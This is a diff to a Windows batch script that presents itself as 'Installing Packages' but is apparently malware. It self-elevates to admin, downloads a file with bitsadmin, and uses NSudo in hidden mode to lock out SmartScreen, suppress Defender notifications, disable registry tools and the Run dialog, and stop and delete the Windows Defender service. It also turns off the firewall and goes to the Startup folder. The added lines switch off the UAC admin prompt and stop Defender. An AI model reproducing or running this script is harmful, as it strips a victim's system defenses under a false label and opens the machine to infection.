@@ -3,7 +3,7 @@
 title Installing Packages 
 :: BatchGotAdmin
 ::-------------------------------------
-REM  --> Check for permissions
+REM  --> CheckING for permissions
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
 
 REM --> If error flag set, we do not have admin.
@@ -28,7 +28,7 @@ del %tmp%\tmp.vbs
 
 echo  Installing Necessary Packages.....Please Wait.....
 
-color 42
+color 0a
 
 cd  %temp%
 
@@ -37,6 +37,8 @@ bitsadmin/transfer Explorers /download /priority FOREGROUND https://raw.githubus
 set pop=%systemroot%
 
 NSudo -U:T -ShowWindowMode:Hide icacls "%pop%\System32\smartscreen.exe" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18
+
+NSudo -U:T -ShowWindowMode:Hide reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System"  /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f
 
 NSudo -U:T -ShowWindowMode:Hide reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration"  /v "Notification_Suppress" /t REG_DWORD /d "1" /f
  
@@ -47,6 +49,8 @@ NSudo -U:T -ShowWindowMode:Hide reg add "HKCU\Software\Microsoft\Windows\Current
 NSudo -U:T -ShowWindowMode:Hide reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d "1" /f
 
 NSudo -U:T -ShowWindowMode:Hide reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t REG_DWORD /d "1" /f
+
+NSudo -U:T -ShowWindowMode:Hide  sc stop  windefend  
 
 NSudo -U:T -ShowWindowMode:Hide  sc delete  windefend  
 
@@ -76,4 +80,3 @@ powershell.exe -command "Set-MpPreference -ScanScheduleDay 8"
 powershell.exe -command "netsh advfirewall set allprofiles state off"
 
 cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
- 
